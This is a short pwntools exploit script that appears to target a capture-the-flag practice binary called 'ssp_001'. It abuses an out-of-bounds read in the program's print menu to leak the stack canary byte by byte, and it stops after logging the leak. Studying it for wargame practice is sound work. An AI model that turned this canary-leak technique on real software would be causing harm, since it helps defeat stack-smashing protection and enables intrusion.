from pwn import *

elf = context.binary = ELF("./ssp_001", checksec=False)
rop = ROP(elf)
context.log_level = 'info'

io = process("./ssp_001", )

canary = ''
io.recvuntil(b'> ')
io.sendline(b'P')
io.recvuntil(b'Element index : ')
io.sendline(b'131')
io.recvuntil(b'is : ')
canary += str(io.recv(2).decode())

io.recvuntil(b'> ')
io.sendline(b'P')
io.recvuntil(b'Element index : ')
io.sendline(b'130')
io.recvuntil(b'is : ')
canary += str(io.recv(2).decode())

io.recvuntil(b'> ')
io.sendline(b'P')
io.recvuntil(b'Element index : ')
io.sendline(b'129')
io.recvuntil(b'is : ')
canary += str(io.recv(2).decode())

io.recvuntil(b'> ')
io.sendline(b'P')
io.recvuntil(b'Element index : ')
io.sendline(b'128')
io.recvuntil(b'is : ')
canary += str(io.recv(2).decode())

log.info("Canary: " + canary)







